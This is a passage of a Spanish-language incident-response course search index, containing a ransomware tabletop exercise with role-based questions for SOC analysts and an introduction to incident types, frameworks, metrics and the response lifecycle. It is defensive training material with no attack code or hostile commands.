expuestos.</p>"},{"location":"Gestion_incidentes/casos/","title":"Casos pr\u00e1cticos de gesti\u00f3n de incidentes","text":""},{"location":"Gestion_incidentes/casos/#1-ejercicio-de-simulacion-de-ransomware","title":"1. Ejercicio de simulaci\u00f3n de ransomware","text":""},{"location":"Gestion_incidentes/casos/#objetivo","title":"Objetivo","text":"<p>Simular un ataque de ransomware y evaluar la capacidad de respuesta del equipo SOC en todos los roles (L1, L2, L3 y SOC Manager).</p>"},{"location":"Gestion_incidentes/casos/#escenario","title":"Escenario","text":"<p>Durante una monitorizaci\u00f3n rutinaria, el SOC observa actividad inusual en la red de la empresa. Varios archivos parecen estar encriptados y se descubre una nota de rescate exigiendo el pago en Bitcoin. El ejercicio comienza con este descubrimiento y procede a trav\u00e9s del ciclo de vida de respuesta a incidentes.</p>"},{"location":"Gestion_incidentes/casos/#alerta-de-red-siem","title":"Alerta de red (SIEM)","text":"<ul> <li>ID de Alerta: 3029  </li> <li>Gravedad Alta  </li> <li>IP de origen: 192.168.1.24  </li> <li>IP de destino: 45.77.89.120  </li> <li>Descripci\u00f3n: Detectada gran transferencia de datos salientes.</li> </ul>"},{"location":"Gestion_incidentes/casos/#log-del-endpoint-edr","title":"Log del Endpoint (EDR)","text":"Hora Evento Usuario Acci\u00f3n 10:02:34 AM Archivo sospechoso descargado user_123 Archivo: <code>invoice_0321.exe</code> 10:04:56 AM Ficheros encriptados detectados user_123 Ficheros encriptados: <code>*.docx</code>, <code>*.xls</code> 10:06:12 AM Nota de rescate creada user_123 Nota: \u00abPague 5 BTC para recuperar sus datos\u00bb."},{"location":"Gestion_incidentes/casos/#fase-1-deteccion-inicial-y-triaje","title":"Fase 1: Detecci\u00f3n inicial y triaje","text":""},{"location":"Gestion_incidentes/casos/#inyeccion-1-actividad-sospechosa-descubierta","title":"Inyecci\u00f3n 1: Actividad sospechosa descubierta","text":"<ol> <li>Una alerta SIEM informa de tr\u00e1fico saliente inusual hacia una IP no reconocida.</li> <li>Los registros EDR revelan una descarga de archivos sospechosa seguida de un r\u00e1pido cifrado de archivos.</li> </ol>"},{"location":"Gestion_incidentes/casos/#preguntas-para-el-analista-l1","title":"Preguntas para el analista L1:","text":"<ol> <li>\u00bfQu\u00e9 medidas iniciales debe tomar al recibir la alerta SIEM?  </li> <li>\u00bfC\u00f3mo valida si esta actividad es maliciosa?  </li> <li>\u00bfCu\u00e1ndo deber\u00eda escalar esta situaci\u00f3n a L2?</li> </ol>"},{"location":"Gestion_incidentes/casos/#preguntas-para-el-analista-de-l2","title":"Preguntas para el analista de L2:","text":"<ol> <li>\u00bfC\u00f3mo confirma si el ransomware est\u00e1 activo?  </li> <li>\u00bfQu\u00e9 registros o herramientas adicionales examinar\u00eda para comprender el alcance?</li> </ol>"},{"location":"Gestion_incidentes/casos/#preguntas-para-el-analista-l3","title":"Preguntas para el analista L3:","text":"<ol> <li>\u00bfQu\u00e9 t\u00e9cnicas forenses avanzadas puedes aplicar para analizar el ransomware?  </li> <li>\u00bfC\u00f3mo identificar\u00eda el vector de ataque y evitar\u00eda que se produjeran m\u00e1s ataques?</li> </ol>"},{"location":"Gestion_incidentes/casos/#preguntas-para-el-responsable-del-soc","title":"Preguntas para el Responsable del SOC:","text":"<ol> <li>\u00bfC\u00f3mo priorizar los siguientes pasos garantizando una interrupci\u00f3n operativa m\u00ednima?  </li> <li>\u00bfQu\u00e9 estrategias de comunicaci\u00f3n aplicar\u00eda para las partes interesadas internas y externas?</li> </ol>"},{"location":"Gestion_incidentes/casos/#fase-2-contencion","title":"Fase 2: Contenci\u00f3n","text":""},{"location":"Gestion_incidentes/casos/#inyeccion-2-propagacion-de-la-infeccion","title":"Inyecci\u00f3n 2: Propagaci\u00f3n de la infecci\u00f3n","text":"<ul> <li>TI informa de que tres servidores del departamento de Finanzas son inaccesibles.  </li> <li>El an\u00e1lisis del tr\u00e1fico de red muestra conexiones continuas a la IP externa (45.77.89.120).</li> </ul>"},{"location":"Gestion_incidentes/casos/#preguntas-para-el-analista-l1_1","title":"Preguntas para el analista L1:","text":"<ol> <li>\u00bfQu\u00e9 medidas debe tomar para aislar los sistemas afectados?  </li> <li>\u00bfC\u00f3mo documenta el incidente para su posterior an\u00e1lisis?</li> </ol>"},{"location":"Gestion_incidentes/casos/#preguntas-para-el-analista-l2","title":"Preguntas para el analista L2:","text":"<ol> <li>\u00bfC\u00f3mo utiliza los datos de tr\u00e1fico de red para contener la amenaza?  </li> <li>\u00bfQu\u00e9 t\u00e9cnicas de mitigaci\u00f3n deben aplicarse para evitar el movimiento lateral?</li> </ol>"},{"location":"Gestion_incidentes/casos/#preguntas-para-el-analista-l3_1","title":"Preguntas para el analista L3:","text":"<ol> <li>\u00bfC\u00f3mo se analiza el malware para crear indicadores de peligro procesables?  </li> <li>\u00bfQu\u00e9 herramientas avanzadas pueden utilizarse para evaluar el alcance completo de los activos afectados?</li> </ol>"},{"location":"Gestion_incidentes/casos/#preguntas-para-soc-manager","title":"Preguntas para SOC Manager:","text":"<ol> <li>\u00bfC\u00f3mo se asegura de que las acciones de contenci\u00f3n se ajustan a las prioridades de la empresa?  </li> <li>\u00bfQu\u00e9 recursos se necesitan para la recuperaci\u00f3n inmediata?</li> </ol>"},{"location":"Gestion_incidentes/casos/#fase-3-analisis-de-la-causa-raiz","title":"Fase 3: An\u00e1lisis de la causa ra\u00edz","text":""},{"location":"Gestion_incidentes/casos/#inyeccion-3-vector-de-ataque-descubierto","title":"Inyecci\u00f3n 3: Vector de ataque descubierto","text":"<ul> <li>Los registros del gateway de correo electr\u00f3nico revelan que el ransomware se origin\u00f3 a partir de un correo electr\u00f3nico de phishing enviado a <code>user_123</code>, con un adjunto malicioso llamado <code>invoice_0321.exe</code>.</li> </ul>"},{"location":"Gestion_incidentes/casos/#preguntas-para-el-analista-l1_2","title":"Preguntas para el analista L1:","text":"<ol> <li>\u00bfC\u00f3mo rastreas el correo electr\u00f3nico de phishing hasta su origen?  </li> <li>\u00bfQu\u00e9 indicadores buscar\u00eda en los correos electr\u00f3nicos de otros usuarios?</li> </ol>"},{"location":"Gestion_incidentes/casos/#preguntas-para-el-analista-l2_1","title":"Preguntas para el analista L2:","text":"<ol> <li>\u00bfC\u00f3mo correlacionas el correo electr\u00f3nico de phishing con la actividad del endpoint?  </li> <li>\u00bfQu\u00e9 recomendaciones har\u00eda para reforzar la seguridad del correo electr\u00f3nico?</li> </ol>"},{"location":"Gestion_incidentes/casos/#preguntas-para-el-analista-l3_2","title":"Preguntas para el analista L3:","text":"<ol> <li>\u00bfC\u00f3mo utiliza la inteligencia sobre amenazas para evaluar el riesgo de ataques similares?  </li> <li>\u00bfQu\u00e9 medidas adicionales pueden tomarse para reforzar los puntos finales?</li> </ol>"},{"location":"Gestion_incidentes/casos/#preguntas-para-el-responsable-del-soc_1","title":"Preguntas para el responsable del SOC:","text":"<ol> <li>\u00bfC\u00f3mo presentas los resultados a los directivos?  </li> <li>\u00bfC\u00f3mo asigna recursos para mejoras a largo plazo?</li> </ol>"},{"location":"Gestion_incidentes/intro/","title":"\ud83d\udee1\ufe0f Introducci\u00f3n a la Gesti\u00f3n de Incidentes (IR)","text":""},{"location":"Gestion_incidentes/intro/#1-contexto-general-vivimos-en-una-superficie-de-ataque-global","title":"1. Contexto general: Vivimos en una superficie de ataque global","text":"<p>Vivimos en una sociedad digital donde cada dispositivo conectado es una puerta potencial para un atacante. Las organizaciones no solo tienen que defender su per\u00edmetro, sino tambi\u00e9n prepararse para cuando esa defensa falle. Y va a fallar.</p> <p>La pregunta no es \u201c\u00bfseremos atacados?\u201d, sino \u201c\u00bfc\u00f3mo responderemos cuando ocurra?\u201d.</p> <p>\ud83d\udcac Frase para la reflexi\u00f3n:</p> <p>\u201cLos ataques cibern\u00e9ticos no son eventos aislados. Son inevitables. Lo que distingue a una organizaci\u00f3n resiliente es su capacidad de respuesta.\u201d </p> <ul> <li>Adaptado de Bruce Schneier</li> </ul>"},{"location":"Gestion_incidentes/intro/#2-que-es-un-incidente-de-seguridad","title":"\u26a0\ufe0f 2. \u00bfQu\u00e9 es un incidente de seguridad?","text":"<p>Un incidente no es simplemente una amenaza o una vulnerabilidad. Es la materializaci\u00f3n del riesgo:  </p> <p>\u201cUn evento adverso real o inminente que pone en peligro la seguridad de los sistemas de informaci\u00f3n.\u201d</p> <p></p>"},{"location":"Gestion_incidentes/intro/#tipos-de-incidentes","title":"Tipos de incidentes","text":"<p>Los incidentes de seguridad se clasifican seg\u00fan su naturaleza, impacto y m\u00e9todo de ejecuci\u00f3n. Estos son los principales tipos:</p> <ol> <li> <p>Incidentes por Malware</p> <ul> <li>Ejemplos: Ransomware, spyware, troyanos, gusanos</li> <li>Impacto: P\u00e9rdida de datos, cifrado de sistemas</li> <li>Caso reciente: Ataque de BlackCat/ALPHV a Change Healthcare (2024)</li> </ul> </li> <li> <p>Ataques de Phishing</p> <ul> <li>Variantes: Spear phishing, smishing, BEC</li> <li>Objetivo: Robo de credenciales</li> <li>T\u00e1ctica com\u00fan: Correos falsos de instituciones</li> </ul> </li> <li> <p>Brechas de Datos</p> <ul> <li>Causas: Vulnerabilidades o errores humanos</li> <li>Consecuencia: Exposici\u00f3n de informaci\u00f3n sensible</li> <li>Ejemplo 2024: Filtraci\u00f3n de 73M registros de AT&amp;T</li> </ul> </li> <li> <p>Ataques DoS/DDoS</p> <ul> <li>Tipos:<ul> <li>Volum\u00e9tricos (UDP flood)</li> <li>Aplicaci\u00f3n (HTTP flood)</li> </ul> </li> <li>Efecto: Inaccesibilidad de servicios</li> </ul> </li> <li> <p>Explotaci\u00f3n de Vulnerabilidades</p> <ul> <li>High-risk: Zero-days</li> <li>Ejemplo cr\u00edtico: Log4Shell (CVE-2021-44228)</li> </ul> </li> <li> <p>Amenazas Internas</p> <ul> <li>Tipos:<ul> <li>Intencionadas (empleados maliciosos)</li> <li>Negligentes (errores humanos)</li> </ul> </li> </ul> </li> <li> <p>Ataques a Cadena de Suministro</p> <ul> <li>Modus operandi: Comprometer software leg\u00edtimo</li> <li>Ejemplo: Ataque a Snowflake (2024)</li> </ul> </li> <li> <p>Secuestro de Cuentas</p> <ul> <li>M\u00e9todos:<ul> <li>Credential stuffing</li> <li>SIM swapping</li> </ul> </li> </ul> </li> <li> <p>Ataques IoT/OT</p> <ul> <li>Riesgo: Infraestructuras cr\u00edticas</li> <li>Ejemplo: Botnets como Mirai</li> </ul> </li> <li> <p>Fraudes Cibern\u00e9ticos</p> <ul> <li>Comunes:<ul> <li>BEC (Business Email Compromise)</li> <li>Cryptojacking</li> </ul> </li> </ul> </li> </ol>"},{"location":"Gestion_incidentes/intro/#clasificacion-por-gravedad","title":"Clasificaci\u00f3n por Gravedad","text":"Nivel Ejemplo Cr\u00edtico Ransomware en hospital Alto Filtraci\u00f3n datos masiva Medio Phishing a empleados Bajo Escaneo de puertos bloqueado"},{"location":"Gestion_incidentes/intro/#ejemplos-reales-solo-en-espana-en-2025","title":"Ejemplos reales s\u00f3lo en Espa\u00f1a en 2025:","text":"<ul> <li>Enero 2025: Ataque de phishing a universitarios en Baleares</li> <li>Enero 2025: Brecha de datos en la Guardia Civil y las Fuerzas Armadas</li> <li>Enero 2025: Telef\u00f3nica sufre un ciberataque en su sistema de ticketing</li> <li>Febrero 2025: Filtraci\u00f3n de datos personales en DKV</li> <li>Marzo 2025: Quedan expuestos datos de clientes de El Corte Ingl\u00e9s</li> <li>Marzo 2025: Ataque prorruso a webs de diputaciones y ayuntamientos en Espa\u00f1a</li> <li>Abril 2025: robo de los datos de las federaciones de aut\u00f3nomos ATA</li> <li>Abril 2025: La compa\u00f1\u00eda Aig\u00fces de Matar\u00f3 sufre un ciberataque</li> <li>Abril 2025: Ransomware dirigido al Ayuntamiento de Badajoz</li> </ul> <p>M\u00e1s detallado aqu\u00ed</p>"},{"location":"Gestion_incidentes/intro/#3-por-que-necesitamos-una-respuesta-estructurada","title":"\ud83e\udde9 3. \u00bfPor qu\u00e9 necesitamos una respuesta estructurada?","text":"<p>\ud83d\udcac Frase para la reflexi\u00f3n:</p> <p>\u201cSecurity is not a product, but a process.\u201d   \u2014 Bruce Schneier</p> <p>Afirmar que la seguridad es un proceso es una forma muy concisa de transmitir la idea de que la seguridad no puede lograrse simplemente comprando y desplegando productos o herramientas de seguridad. Por el contrario, la verdadera seguridad requiere esfuerzos continuos y exhaustivos que comprenden una amplia gama de actividades y pr\u00e1cticas. La seguridad es un proceso din\u00e1mico y polifac\u00e9tico que requiere un esfuerzo coordinado y continuo. Se trata de crear un sistema resistente que debe adaptarse a los nuevos retos y amenazas a lo largo del tiempo. </p> <p>Una buena defensa no siempre puede evitar un ataque. Pero una mala respuesta puede empeorarlo. Un ejemplo frecuente es reiniciar un equipo infectado sin preservar evidencias, lo cual impide an\u00e1lisis forense posterior.</p> <p>Por eso, la respuesta a incidentes (IR) es un proceso formal y met\u00f3dico que busca:</p> <ul> <li>Minimizar impacto</li> <li>Restaurar operaciones</li> <li>Preservar evidencias</li> <li>Aprender del incidente</li> </ul>"},{"location":"Gestion_incidentes/intro/#4-fundamentos-normativos-y-frameworks","title":"\ud83c\udfdb\ufe0f 4. Fundamentos normativos y frameworks","text":""},{"location":"Gestion_incidentes/intro/#normativas-y-estandares","title":"\ud83d\udcda Normativas y est\u00e1ndares:","text":"<ul> <li>NIST SP 800-61 rev.2: Gu\u00eda de manejo de incidentes (marco de referencia m\u00e1s usado)</li> <li>ISO/IEC 27035: Est\u00e1ndar internacional para gesti\u00f3n de incidentes</li> <li>ENS (Espa\u00f1a): Exige capacidades de IR a sistemas de informaci\u00f3n p\u00fablicos</li> <li>NIS2 (Europa): La NIS2 (Network and Information Security Directive 2) es una normativa de la Uni\u00f3n Europea que refuerza y reemplaza a la directiva original NIS (2016), ampliando sus exigencias en materia de ciberseguridad para sectores cr\u00edticos y operadores esenciales.</li> </ul>"},{"location":"Gestion_incidentes/intro/#ciberseguridad-en-capas","title":"\ud83d\udd10 Ciberseguridad en capas:","text":"<p>La respuesta a incidentes se sit\u00faa en la \u00faltima l\u00ednea de defensa, justo despu\u00e9s de que todas las otras capas han fallado.</p>"},{"location":"Gestion_incidentes/intro/#5-ciclo-de-vida-de-la-respuesta-a-incidentes","title":"\ud83e\udde0 5. Ciclo de Vida de la Respuesta a Incidentes","text":"<p>Inspirado en NIST, el proceso se divide en fases interdependientes</p> <p></p> <p>\ud83d\udccc Nota: Algunas organizaciones a\u00f1aden una fase 0 (\u201cPreparaci\u00f3n estrat\u00e9gica\u201d) y una 6 (\u201cAutomatizaci\u00f3n y mejora continua\u201d).</p>"},{"location":"Gestion_incidentes/intro/#1-preparacion","title":"\ud83e\uddf0 1. Preparaci\u00f3n","text":"<p>La fase de preparaci\u00f3n es la primera y m\u00e1s cr\u00edtica etapa del ciclo de vida de la respuesta a incidentes. Su objetivo es garantizar que la organizaci\u00f3n est\u00e9 lista antes de que ocurra un incidente, minimizando su impacto y acelerando la recuperaci\u00f3n.</p> <p>Seg\u00fan NIST, una preparaci\u00f3n s\u00f3lida marca la diferencia entre el caos y la contenci\u00f3n eficaz.</p>"},{"location":"Gestion_incidentes/intro/#objetivos-de-esta-fase","title":"\ud83c\udfaf Objetivos de esta fase","text":"<ul> <li>Establecer un plan formal y claro de actuaci\u00f3n ante incidentes.</li> <li>Definir roles, responsabilidades y flujos de comunicaci\u00f3n.</li> <li>Entrenar al personal y fortalecer la infraestructura de seguridad.</li> <li>Asegurar que existan herramientas, documentaci\u00f3n y procesos actualizados.</li> </ul>"},{"location":"Gestion_incidentes/intro/#componentes-clave-de-la-preparacion","title":"\ud83d\uddc2\ufe0f Componentes clave de la preparaci\u00f3n","text":""},{"location":"Gestion_incidentes/intro/#11-plan-de-respuesta-a-incidentes-irp","title":"\u2705 1.1 Plan de Respuesta a Incidentes (IRP)","text":"<ul> <li>Documento estrat\u00e9gico y operativo que define qu\u00e9 hacer, qui\u00e9n lo hace y c\u00f3mo ante distintos tipos de incidentes.</li> <li>Debe incluir procedimientos, taxonom\u00eda, criterios de severidad, matrices de escalado y canales de comunicaci\u00f3n.</li> <li>Debe actualizarse al menos una vez al a\u00f1o o tras incidentes cr\u00edticos.</li> </ul>"},{"location":"Gestion_incidentes/intro/#12-creacion-del-csirt-irt","title":"\ud83d\udc65 1.2 Creaci\u00f3n del CSIRT / IRT","text":"<ul> <li>Un Computer Security Incident Response Team o equipo de respuesta puede ser interno, mixto o subcontratado.</li> <li>Composici\u00f3n multidisciplinar: ciberseguridad, legal, TI, RRHH, comunicaci\u00f3n.</li> <li>Debe tener autoridad, herramientas y l\u00edneas de comunicaci\u00f3n directa con la direcci\u00f3n.</li> </ul>"},{"location":"Gestion_incidentes/intro/#13-politicas-normas-y-procedimientos","title":"\ud83d\udcdc 1.3 Pol\u00edticas, normas y procedimientos","text":"<ul> <li>Pol\u00edtica de gesti\u00f3n de incidentes (qui\u00e9n reporta, tiempos de notificaci\u00f3n, etc.).</li> <li>Pol\u00edticas relacionadas: uso aceptable, control de accesos, clasificaci\u00f3n de la informaci\u00f3n.</li> <li>Procedimientos operativos normalizados (SOP): recuperaci\u00f3n de sistemas, aislamiento de red, backup seguro.</li> </ul>"},{"location":"Gestion_incidentes/intro/#14-inventario-y-clasificacion-de-activos","title":"\ud83d\udda5\ufe0f 1.4 Inventario y clasificaci\u00f3n de activos","text":"<ul> <li>Listado actualizado de sistemas cr\u00edticos, redes, datos sensibles y proveedores clave.</li> <li>Identificaci\u00f3n de sistemas que requieren protecci\u00f3n reforzada (seg\u00fan ENS, RGPD, etc.).</li> </ul>"},{"location":"Gestion_incidentes/intro/#15-canales-de-comunicacion-establecidos","title":"\ud83d\udcde 1.5 Canales de comunicaci\u00f3n establecidos","text":"<ul> <li>Definici\u00f3n de contactos internos (SOC, IT, CISO, legales) y externos (CERT/CC, proveedores, polic\u00eda).</li> <li>Protocolos de comunicaci\u00f3n en caso de contingencia (email alternativo, m\u00f3viles, canales encriptados).</li> </ul>"},{"location":"Gestion_incidentes/intro/#16-formacion-y-simulacros","title":"\ud83e\uddea 1.6 Formaci\u00f3n y simulacros","text":"<ul> <li>Formaci\u00f3n continua del personal t\u00e9cnico y no t\u00e9cnico.</li> <li>Ejercicios tipo Tabletop: simulaci\u00f3n en sala para discutir respuestas.</li> <li>Red Team / Blue Team: ejercicios ofensivos y defensivos realistas para poner a prueba planes.</li> <li>Lecciones aprendidas de cada simulacro \u2192 mejoras en IRP y formaci\u00f3n.</li> </ul>"},{"location":"Gestion_incidentes/intro/#buenas-practicas","title":"\ud83d\udee0\ufe0f Buenas pr\u00e1cticas","text":"<ul> <li>Disponer de herramientas EDR, SIEM o ticketing ya preconfiguradas.</li> <li> <p>Establecer m\u00e9tricas para evaluar la preparaci\u00f3n (MTTD, MTTR).</p> <p>\u23f1\ufe0f Tipos de Tiempos que se Miden en Respuesta a Incidentes (IR)</p> <p>### \u23f1\ufe0f Tipos de Tiempos que se Miden en Respuesta a Incidentes (IR)</p> </li> </ul> Tiempo Definici\u00f3n Importancia MTTD (Mean Time to Detect) Tiempo medio desde que ocurre un incidente hasta que se detecta. Eval\u00faa la eficacia de las herramientas de detecci\u00f3n y monitorizaci\u00f3n. MTTI (Mean Time to Identify) Tiempo medio desde la detecci\u00f3n hasta confirmar que es un incidente. Refleja la capacidad de an\u00e1lisis y clasificaci\u00f3n del equipo. MTTR (Mean Time to Respond) Tiempo medio desde la identificaci\u00f3n hasta iniciar la respuesta. Mide la agilidad de reacci\u00f3n del CSIRT. MTTC (Mean Time to Contain) Tiempo medio desde la detecci\u00f3n hasta contener completamente el incidente. Indica rapidez para controlar la amenaza. MTTE (Mean Time to Eradicate) Tiempo medio para eliminar la causa ra\u00edz (malware, acceso, vulnerabilidad). Eval\u00faa eficiencia en limpieza y erradicaci\u00f3n. MTTR (Mean Time to Recover) Tiempo medio para restaurar el sistema a su estado operativo normal. Refleja la resiliencia y capacidad de recuperaci\u00f3n. TTR (Time to Report) Tiempo desde la detecci\u00f3n hasta la notificaci\u00f3n oficial del incidente. Clave para cumplimiento legal (RGPD, ENS, NIS2, etc.). Time to Learn Tiempo desde la resoluci\u00f3n hasta la incorporaci\u00f3n de mejoras. Mide madurez organizativa y aprendizaje post-incidente. <ul> <li>Alinear la preparaci\u00f3n con normativas como el ENS, la NIS2, y ISO 27035.</li> <li>Hacer pruebas cruzadas con otras funciones: continuidad del negocio, protecci\u00f3n de datos, etc.</li> </ul>"},{"location":"Gestion_incidentes/intro/#resultado-esperado","title":"\ud83d\udccc Resultado esperado","text":"<p>Una organizaci\u00f3n preparada:</p> <ul> <li>Tiene procedimientos documentados y conocidos por todos los actores.</li> <li>Puede responder de forma ordenada, r\u00e1pida y efectiva.</li> <li>Reduce riesgos legales, reputacionales y econ\u00f3micos ante cualquier incidente.</li> </ul>"},{"location":"Gestion_incidentes/intro/#2-deteccion-y-analisis","title":"\ud83d\udd0e 2. Detecci\u00f3n y an\u00e1lisis","text":"<p>La fase de detecci\u00f3n y an\u00e1lisis es el punto en el que una organizaci\u00f3n reconoce una posible amenaza y comienza a investigarla. Esta etapa es cr\u00edtica para reducir el tiempo de respuesta y evitar que el incidente escale.</p> <p>Una buena detecci\u00f3n solo es posible si la fase de preparaci\u00f3n se ha ejecutado correctamente.</p>"},{"location":"Gestion_incidentes/intro/#objetivos-de-la-fase","title":"\ud83e\udded Objetivos de la fase","text":"<ul> <li>Identificar actividades an\u00f3malas o maliciosas en tiempo y forma.</li> <li>Correlacionar eventos para determinar si constituyen un incidente.</li> <li>Clasificar el incidente, evaluando su gravedad e impacto.</li> <li>Activar el plan de respuesta correspondiente.</li> </ul>"},{"location":"Gestion_incidentes/intro/#herramientas-clave-para-la-deteccion","title":"\ud83e\uddf0 Herramientas clave para la detecci\u00f3n","text":"Herramienta / Tecnolog\u00eda Funci\u00f3n principal SIEM (Security Information and Event Management) Recolecta, centraliza y correlaciona logs de m\u00faltiples fuentes. IDS/IPS (Intrusion Detection/Prevention Systems) Detecta y/o bloquea tr\u00e1fico malicioso en la red. EDR/XDR (Endpoint/Extended Detection and Response) Supervisa y responde a amenazas en endpoints (PCs, servidores, etc.). Logs y auditor\u00eda Registro detallado de eventos en sistemas, aplicaciones y redes. Herramientas de threat intelligence Enriquecen alertas con datos sobre actores y campa\u00f1as conocidas."},{"location":"Gestion_incidentes/intro/#proceso-tipico-de-analisis","title":"\ud83d\udd04 Proceso t\u00edpico de an\u00e1lisis","text":"<ol> <li> <p>Recolecci\u00f3n de alertas o indicadores</p> <ul> <li>Las alertas pueden provenir de sensores autom\u00e1ticos (SIEM, EDR), usuarios finales, proveedores, etc.</li> </ul> </li> <li> <p>Correlaci\u00f3n y contextualizaci\u00f3n</p> <ul> <li>El analista revisa patrones y relaciones entre eventos: \u00bfse trata de una secuencia aleatoria o una amenaza organizada?</li> </ul> </li> <li> <p>Verificaci\u00f3n</p> <ul> <li>No toda alerta es un incidente. Muchas son falsos positivos. Hay que confirmar:  <ul> <li>\u00bfEs un incidente real?</li> <li>\u00bfQu\u00e9 sistemas est\u00e1n afectados?</li> <li>\u00bfCu\u00e1l es el vector de ataque?</li> </ul> </li> </ul> </li> <li> <p>Clasificaci\u00f3n mediante taxonom\u00eda</p> <ul> <li>Se asigna una categor\u00eda y subcategor\u00eda al incidente seg\u00fan su naturaleza (malware, fuga de datos, DDoS\u2026).</li> <li>Tambi\u00e9n se determina su nivel de criticidad (bajo, medio, alto, cr\u00edtico).</li> <li>Esto permite seleccionar el playbook adecuado para la respuesta.</li> </ul> </li> <li> <p>Registro del incidente</p> <ul> <li>Se documenta en una base de datos o herramienta de ticketing, incluyendo:<ul> <li>Hora de detecci\u00f3n</li> <li>Fuente</li> <li>Clasificaci\u00f3n</li> <li>Responsable asignado</li> <li>Acciones iniciales tomadas</li> </ul> </li> </ul> </li> </ol>"},{"location":"Gestion_incidentes/intro/#criterios-de-severidad-ejemplo","title":"\ud83d\udcca Criterios de severidad (ejemplo)","text":"Nivel Descripci\u00f3n Ejemplo Bajo No afecta sistemas cr\u00edticos, impacto menor Usuario abre phishing pero no clickea Medio Afecta a usuarios individuales o servicios secundarios Malware aislado en un PC Alto Afecta sistemas clave o datos sensibles Exfiltraci\u00f3n de datos con impacto legal Cr\u00edtico Amenaza para toda la organizaci\u00f3n Ransomware en m\u00faltiples servidores clave"},{"location":"Gestion_incidentes/intro/#rol-de-la-taxonomia-de-incidentes","title":"\ud83e\uddf1 Rol de la taxonom\u00eda de incidentes","text":"<p>Durante esta fase se utiliza una taxonom\u00eda estructurada para clasificar el incidente correctamente. Esto facilita:</p> <ul> <li>Escalar correctamente el incidente.</li> <li>Activar el procedimiento (playbook) adecuado.</li> <li>Obtener estad\u00edsticas y reportes consistentes.</li> <li>Cumplir con requisitos regulatorios (ENS, NIS2, ISO 27035\u2026).</li> </ul> <p>\ud83d\udccc M\u00e1s adelante profundizaremos en la taxonom\u00eda de incidentes.</p>"},{"location":"Gestion_incidentes/intro/#ejemplo-real","title":"\u26a0\ufe0f Ejemplo real","text":"<p>\ud83d\udd14 Un EDR detecta la ejecuci\u00f3n de un script PowerShell cifrado en un servidor interno.</p> <p>\ud83d\udccc Proceso:</p> <ul> <li>El evento llega al SIEM y se correlaciona con una conexi\u00f3n sospechosa saliente.</li> <li>Se identifica como posible malware con comportamiento de exfiltraci\u00f3n.</li> <li>El analista lo clasifica como:<ul> <li>Categor\u00eda: Malware</li> <li>Subcategor\u00eda: Downloader + Exfiltraci\u00f3n</li> <li>Severidad: Alta</li> </ul> </li> <li>Se activa el playbook de contenci\u00f3n de malware y se notifica a la direcci\u00f3n.</li> </ul>"},{"location":"Gestion_incidentes/intro/#conclusion","title":"\ud83e\udde0 Conclusi\u00f3n","text":"<p>Una detecci\u00f3n eficaz requiere:</p> <ul> <li>Visibilidad completa del entorno</li> <li>Herramientas adecuadas de monitoreo</li> <li>Analistas capacitados y documentaci\u00f3n clara</li> <li>Coordinaci\u00f3n con la fase de preparaci\u00f3n</li> </ul> <p>Una mala detecci\u00f3n puede convertir un incidente leve en una crisis mayor.</p>"},{"location":"Gestion_incidentes/intro/#3-fase-de-contencion","title":"\ud83d\uded1 3. Fase de Contenci\u00f3n","text":"<p>Una vez confirmado el incidente, la prioridad es limitar su alcance y da\u00f1o lo antes posible. Esta fase consiste en detener la propagaci\u00f3n, evitar la p\u00e9rdida de informaci\u00f3n y proteger los activos cr\u00edticos.</p>"},{"location":"Gestion_incidentes/intro/#objetivos","title":"\ud83c\udfaf Objetivos","text":"<ul> <li>Minimizar el impacto del incidente.</li> <li>Proteger sistemas no afectados.</li> <li>Ganar tiempo para investigar y planificar la recuperaci\u00f3n.</li> </ul>"},{"location":"Gestion_incidentes/intro/#tipos-de-contencion","title":"\u2699\ufe0f Tipos de contenci\u00f3n","text":""},{"location":"Gestion_incidentes/intro/#contencion-a-corto-plazo","title":"\ud83d\udccd Contenci\u00f3n a corto plazo","text":"<ul> <li>Acci\u00f3n inmediata para aislar o desconectar sistemas afectados.</li> <li>Ejemplos:<ul> <li>Quitar de la red el equipo comprometido.</li> <li>Bloquear direcciones IP sospechosas en el firewall.</li> <li>Cerrar sesiones activas del atacante.</li> </ul> </li> </ul>"},{"location":"Gestion_incidentes/intro/#contencion-a-largo-plazo","title":"\ud83e\udde9 Contenci\u00f3n a largo plazo","text":"<ul> <li>Acciones que preparan el sistema para una recuperaci\u00f3n segura.</li> <li>Ejemplos:<ul> <li>Aplicaci\u00f3n de parches de seguridad.</li> <li>Cambio de credenciales comprometidas.</li> <li>Reconfiguraci\u00f3n de servicios expuestos.</li> </ul> </li> </ul> <p>\u26a0\ufe0f \u00a1Ojo! Actuar demasiado r\u00e1pido sin an\u00e1lisis puede destruir evidencias forenses.</p>"},{"location":"Gestion_incidentes/intro/#requiere","title":"\ud83e\udde0 Requiere:","text":"<ul> <li>Decisiones r\u00e1pidas pero estrat\u00e9gicas y justificadas.</li> <li>Coordinaci\u00f3n entre CSIRT, legal y TI.</li> <li>Consideraci\u00f3n del impacto operacional y reputacional.</li> </ul>"},{"location":"Gestion_incidentes/intro/#4-fase-de-erradicacion-y-recuperacion","title":"\ud83e\uddf9 4. Fase de Erradicaci\u00f3n y Recuperaci\u00f3n","text":"<p>Con el incidente contenido, es hora de eliminar cualquier rastro de la amenaza y restaurar los sistemas afectados de forma segura.</p>"},{"location":"Gestion_incidentes/intro/#erradicacion","title":"\ud83d\udd0d Erradicaci\u00f3n","text":"<ul> <li>Eliminar el malware, herramientas del atacante, cuentas no autorizadas o backdoors.</li> <li>Buscar persistencia: el atacante podr\u00eda haber instalado mecanismos para volver a entrar.</li> <li>Comprobar los registros y hashes para validar que no quedan trazas.</li> </ul>"},{"location":"Gestion_incidentes/intro/#verificacion","title":"\ud83e\uddea Verificaci\u00f3n","text":"<ul> <li>Escaneo de sistemas con antivirus/EDR actualizados.</li> <li>An\u00e1lisis de logs y tr\u00e1fico de red post-incidente.</li> <li>Validaci\u00f3n de integridad (checksums, firmas digitales\u2026).</li> </ul>"},{"location":"Gestion_incidentes/intro/#recuperacion","title":"\u267b\ufe0f Recuperaci\u00f3n","text":"<ul> <li>Restaurar servicios desde backups verificados.</li> <li>Aplicar actualizaciones y configuraciones reforzadas.</li> <li>Reincorporar los sistemas a la red solo cuando est\u00e9n validados.</li> <li>Realizar pruebas funcionales y de seguridad.</li> </ul>"},{"location":"Gestion_incidentes/intro/#objetivo-final","title":"\u2705 Objetivo final","text":"<p>Volver a la normalidad con garant\u00edas de que la amenaza ha sido eliminada y no puede repetirse por el mismo vector.</p>"},{"location":"Gestion_incidentes/intro/#5-fase-de-lecciones-aprendidas","title":"\ud83d\udccb 5. Fase de Lecciones 